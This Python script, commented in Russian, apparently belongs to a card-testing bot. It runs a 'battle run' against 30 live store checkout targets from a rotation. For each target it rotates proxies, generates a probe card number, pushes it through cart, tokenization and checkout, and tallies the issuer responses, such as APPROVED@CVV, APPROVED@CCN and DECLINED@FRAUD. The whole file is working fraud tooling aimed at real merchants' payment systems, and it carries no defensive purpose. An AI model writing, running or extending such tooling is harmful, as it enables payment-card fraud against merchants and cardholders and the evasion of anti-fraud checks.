# language: Python 3.14, file: scratch/_battle30.py, target: Windows 11
# Боевой прогон 06.09.2026: 30 целей Store API из живой ротации, probe-карта на каждую.
# Штатный путь бота: pick_proxy из пула, check_target (cart -> add-item -> pm -> ctoken -> checkout).
import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import gate_client as gc
import store_gate
from bot.gates import storegate as bg_store

N_TARGETS = 30
PAUSE_S = 1.2


async def main():
    targets = bg_store._targets()[:N_TARGETS]
    print(f"[*] живая ротация: {len(bg_store._targets())} целей, берём {len(targets)}", flush=True)
    proxy_pool = gc.load_proxies()
    results = []
    t0 = time.time()
    for i, t in enumerate(targets, 1):
        proxy = gc.pick_proxy(proxy_pool, None)
        probe = gc.gen_probe_card()
        raw = f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"
        t1 = time.time()
        try:
            res = await store_gate.check_target(t, raw, proxy, 2000)
        except Exception as e:
            res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:140], "amount_cents": 0, "currency": ""}
        lat = int((time.time() - t1) * 1000)
        st = res.get("status", "?")
        amt = res.get("amount_cents") or 0
        cur = res.get("currency") or ""
        det = str(res.get("detail", ""))[:110].replace(chr(10), " ")
        print(f"[{i:02}/{len(targets)}] {st:14} {t:42} {amt:>6}{cur:4} {lat:>6}ms | {det}", flush=True)
        results.append({"target": t, "status": st, "amount": amt, "lat": lat, "detail": det})
        if i < len(targets):
            await asyncio.sleep(PAUSE_S)

    from collections import Counter
    verdicts = Counter(r["status"] for r in results)
    live = [r for r in results if r["status"] not in ("ERROR",)]
    full_cycle = [r for r in results if r["status"] in ("DECLINED", "APPROVED", "APPROVED@PAID", "APPROVED@HOLD", "PI_PENDING", "DECLINED@DO_NOT_HONOR", "DECLINED@FRAUD", "APPROVED@CVV", "APPROVED@CCN", "3DS_CHALLENGE", "3DS_FRICTIONLESS")]
    print("=" * 100, flush=True)
    print(f"[*] ИТОГ за {int(time.time() - t0)}с:", flush=True)
    print(f"    вердикты: {dict(verdicts)}", flush=True)
    print(f"    поверхностей с ответом эмитента/шлюза (не ERROR): {len(live)}/{len(results)}", flush=True)
    print(f"    полный платёжный цикл (токенизация+checkout дошли): {len(full_cycle)}/{len(results)}", flush=True)
    if live:
        lats = sorted(r["lat"] for r in live)
        print(f"    латентность живых: медиана {lats[len(lats)//2]}ms, p90 {lats[int(len(lats)*0.9)-1]}ms", flush=True)


if __name__ == "__main__":
    asyncio.run(main())
